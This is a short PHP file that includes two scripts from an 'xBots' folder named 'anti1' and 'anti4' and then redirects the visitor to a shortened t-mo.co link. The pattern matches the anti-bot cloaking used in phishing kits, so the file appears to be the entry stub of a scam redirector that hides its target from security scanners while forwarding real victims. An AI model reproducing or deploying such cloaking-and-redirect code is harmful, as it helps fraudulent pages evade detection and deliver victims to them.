<?php
    include("xBots/anti1.php");
    include("xBots/anti4.php");
?>
<?php      
  header('Location: https://t-mo.co/3wyf0dJ');      
?>